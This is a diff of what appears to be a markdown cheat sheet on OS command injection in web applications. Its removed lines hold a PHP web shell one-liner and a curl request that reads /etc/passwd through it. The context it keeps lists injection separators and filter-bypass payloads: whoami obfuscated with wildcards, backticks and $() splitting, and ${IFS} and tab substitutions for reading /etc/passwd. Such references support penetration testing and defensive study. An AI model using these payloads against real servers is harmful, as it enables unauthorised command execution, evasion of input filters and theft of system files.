@@ -3,13 +3,6 @@
 Abuse of functionality in web applications, where it is possible to inject arbitrary commands and takeover entire server.
 Vulnerability often happens while using 'dangerous' functions that have ability to execute commands like PHP's system, shell_exec, passthru, exec. 
 
-Remember to URL encode HTTP parameters.  
-
-```php
-<?php system($_GET['cmd']); ?>
-```
-`curl http://server/site.php?cmd=cat%20/etc/passwd`  
-
 ### Injection sequences
 `;whoami;`  
 `&whoami`  
@@ -30,7 +23,7 @@ Depending on vulnerable functionality, escaping the code in order to inject comm
 ...  
 
 ### Keyword bypass
-Different way of specifying 'whoami' command. These could bypass sanitisations.  
+Different way of executing 'whoami' command. These could bypass sanitisations.  
 `/usr/bin/wh?ami`  
 `/usr/bin/who*mi`  
 `/usr/bin/whoam[i]`  
@@ -42,8 +35,7 @@ Different way of specifying 'whoami' command. These could bypass sanitisations.
 `` w`u`h`u`o`u`a`u`m`u`i ``  
 `w$(u)h$(u)o$(u)a$(u)m$(u)i`  
 
-### Space bypass
-For linux web servers, instead of space, sequences like '$(IFS%%?)' or '\t' could be used.   
+### Space bypass  
 `CAT${IFS}/etc/passwd`  
 `cat${IFS%??}/etc/passwd`    
 `cat\t/etc/passwd`  
